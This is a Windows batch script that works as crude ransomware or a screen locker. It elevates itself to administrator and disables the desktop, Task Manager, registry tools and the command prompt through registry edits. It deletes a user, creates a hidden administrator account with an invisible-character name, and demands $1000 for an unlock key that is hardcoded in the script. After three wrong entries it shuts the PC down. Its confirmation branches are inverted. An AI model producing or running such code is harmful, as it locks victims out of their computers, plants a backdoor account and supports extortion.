@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit
)

choice /m "Are you sure to run this?"
if %errorlevel%==1 goto no
if %errorlevel%==2 goto yes

:yes
echo 54 54 54 68 69 65 68 87 65 78 78 65 67 82 89 >> hidekey.txt


reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /f



:: Disable Ctrl+Alt+Del requirement (DisableCAD)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCAD /t REG_DWORD /d 1 /f

:: Disable Task Manager
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
net user RDP /delete

:: Disable CMD
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f


net user "ㅤ" DEAD123@LOCKED999123999123 /add
net localgroup Administrators "ㅤ" /add

echo This is the virus . it can destroy your PC . if you scare of the virus and want to delete it . give 1000$ to 4532 1987 6543 2109

It send you the key in your email and type it to Key:


set key=666DEADWANNACRY
set tries=0

:ask
set /p input=key: 

if "%input%"=="%key%" goto correct

set /a tries+=1
if %tries% GEQ 3 goto wrong

echo Wrong key.
goto ask

:correct
echo CORRECT
pause
exit

:wrong
echo You wrong all 3 times . Now the PC shutdown
shutdown /s /t 5





:no
echo You're safe
pause
exit